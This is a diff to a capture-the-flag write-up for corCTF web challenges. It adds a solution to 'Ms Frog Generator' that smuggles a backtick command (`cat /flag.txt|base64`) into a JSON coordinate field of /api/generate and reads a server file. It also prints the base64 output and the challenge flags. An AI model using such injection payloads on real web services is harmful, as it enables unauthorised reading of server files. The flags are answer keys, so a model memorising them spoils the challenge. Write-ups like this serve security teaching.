@@ -51,6 +51,17 @@ Flag: corctf{th3_linkedin_JSON_quiz_is_too_h4rd!!!}
 
 
 # 2. Ms Frog Generator
-Challenge Descritpion:
+Challenge Descritpion:The vanilla msfrog is hard to beat, but this webapp allows you to make it even better! 
+Solution:
+Looking at the request and response of /api/generate, we can see that there is command injection in it.
+
+```
+[{"type":"mskiss.png","pos":{"x":"`cat /flag.txt|base64`","y":0}}]
+```
+This will give the following encoding:
+Y29yY3Rme3NoMHVsZF9oNHZlX3IzbmRlcjNkX2NsMTNudF9zMWRlXzptc2Zyb2c6fQo=
+Flag: corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}
+
+# 3. Simple Waf
 
 
